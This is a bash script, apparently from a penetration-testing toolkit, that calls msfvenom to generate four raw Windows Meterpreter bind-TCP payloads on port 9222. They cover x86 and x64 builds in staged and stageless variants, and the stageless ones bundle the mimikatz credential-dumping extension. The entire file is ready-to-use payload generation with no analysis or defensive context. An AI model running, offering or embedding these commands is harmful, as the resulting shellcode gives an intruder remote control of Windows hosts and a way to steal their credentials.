#!/bin/bash

# Windows x86 Bind TCP 9222 Stageless with mimikatz
msfvenom -p windows/meterpreter_bind_tcp -f raw LPORT=9222 ExitFunc=thread EXTENSIONS=stdapi,priv,mimikatz -o windows/x86_bind_tcp_9222_stageless

# Windows x86 Bind TCP 9222 Staged
msfvenom -p windows/meterpreter/bind_tcp -f raw LPORT=9222 EXITFUNC=thread -o windows/x86_bind_tcp_9222

# Windows x64 Bind TCP 9222 Stageless with mimikatz
msfvenom -p windows/x64/meterpreter_bind_tcp -f raw LPORT=9222 ExitFunc=thread EXTENSIONS=stdapi,priv,mimikatz -o windows/x64_bind_tcp_9222_stageless

# Windows x64 Bind TCP 9222 Staged
msfvenom -p windows/x64/meterpreter/bind_tcp -f raw LPORT=9222 EXITFUNC=thread -o windows/x64_bind_tcp_9222
